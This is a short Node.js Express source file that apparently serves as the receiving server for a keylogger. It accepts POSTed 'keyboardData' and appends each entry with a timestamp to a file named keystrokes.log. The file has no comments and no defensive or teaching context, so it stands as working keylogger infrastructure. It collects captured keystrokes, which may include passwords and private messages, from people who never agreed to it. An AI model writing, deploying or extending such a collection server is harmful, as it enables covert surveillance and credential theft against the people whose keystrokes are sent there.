const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs");


const app = express();
const port = 8080;

app.use(bodyParser.json());

app.post("/", (req,res)=> {
    const {keyboardData} = req.body;


    if (!keyboardData){
        return res.status(400).send("Invalid Request! No keyboard data received.");
    }

    console.log("keyboard Received:",keyboardData);
    const timestamp = new Date().toISOString();
    fs.appendFile("keystrokes.log",`[${timestamp}] ${keyboardData}\n`,(err) => {
        if (err){
            console.error("Error saving logs :",err);
            return res.status(500).send("Failed to save logs.")
        }
    });
    res.status(200).send("keystrokes logged successfull.")
});

app.listen(port , ()=> {
    console.log(`server is running on ${port}`);
});